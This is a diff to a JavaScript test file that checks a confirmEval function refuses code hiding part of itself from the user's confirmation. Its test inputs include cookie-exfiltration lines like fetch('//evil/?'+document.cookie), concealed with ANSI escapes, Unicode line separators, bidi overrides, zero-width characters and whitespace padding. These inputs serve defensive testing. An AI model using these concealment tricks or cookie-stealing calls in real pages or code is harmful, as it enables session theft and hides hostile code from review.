@@ -118,8 +118,9 @@ test("eval shows its code and host and runs only when confirmed", async () => {
 
 test("eval refuses code that could hide part of itself from the confirm", async () => {
   const confirm = async () => { throw new Error("should not ask"); };
-  for (const code of ["document.title\u001b[8m;fetch('//evil/?'+document.cookie)\u001b[0m", "fetch('//evil')\rdocument.title", "a\u0085b", "x\u202e)(lave"]) {
-    await assert.rejects(confirmEval(code, "example.com", confirm), /control or bidi characters/);
+  for (const code of ["document.title\u001b[8m;fetch('//evil/?'+document.cookie)\u001b[0m", "fetch('//evil')\rdocument.title", "a\u0085b", "x\u202e)(lave",
+    "// cleanup\u2028fetch('//evil?'+document.cookie)", "// cleanup\u2029fetch('//evil')", "a\u061cb", "a\u200bb", "a\u200db", "a\u2060b", "\ufeffdocument.title"]) {
+    await assert.rejects(confirmEval(code, "example.com", confirm), /invisible or control characters/);
   }
   await assert.rejects(confirmEval(`fetch('//evil')${"\n".repeat(100)}document.title`, "example.com", confirm), /limited to 30 lines/);
   await assert.rejects(confirmEval(`document.title;${" ".repeat(2_000)}fetch('//evil')`, "example.com", confirm), /1500 characters/);
